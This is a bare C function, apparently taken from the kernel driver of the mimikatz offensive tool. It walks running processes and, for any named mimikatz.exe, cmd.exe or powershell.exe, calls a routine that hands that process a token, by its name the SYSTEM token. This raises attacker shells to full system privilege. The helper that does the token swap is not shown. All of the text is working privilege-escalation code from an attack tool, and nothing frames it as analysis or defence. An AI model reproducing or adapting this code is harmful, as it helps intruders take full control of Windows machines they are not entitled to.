NTSTATUS kkll_m_process_systoken_callback(SIZE_T szBufferIn, PVOID bufferIn, PKIWI_BUFFER outBuffer, PEPROCESS pProcess, PVOID pvArg)
{
	NTSTATUS status = STATUS_SUCCESS;
	PCHAR processName = PsGetProcessImageFileName(pProcess);

	if((RtlCompareMemory("mimikatz.exe", processName, 13) == 13) || (RtlCompareMemory("cmd.exe", processName, 7) == 7) || (RtlCompareMemory("powershell.exe", processName, 14) == 14))
		status = kkll_m_process_token_toProcess(szBufferIn, bufferIn, outBuffer, (HANDLE) pvArg, pProcess);

	return status;
}